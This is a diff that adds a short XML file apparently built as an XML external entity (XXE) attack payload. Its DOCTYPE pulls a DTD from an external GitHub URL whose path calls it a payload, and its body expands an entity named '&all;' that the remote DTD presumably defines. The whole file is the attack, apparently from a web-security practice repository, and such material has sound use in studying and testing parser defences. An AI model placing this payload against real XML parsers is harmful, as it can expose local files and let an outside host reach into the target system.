@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test SYSTEM "https://raw.githubusercontent.com/NMahesh20/back-to-college/refs/heads/main/web-sec/xml/payload.xml">
+<results>
+    <check>&all;</check>
+</results>
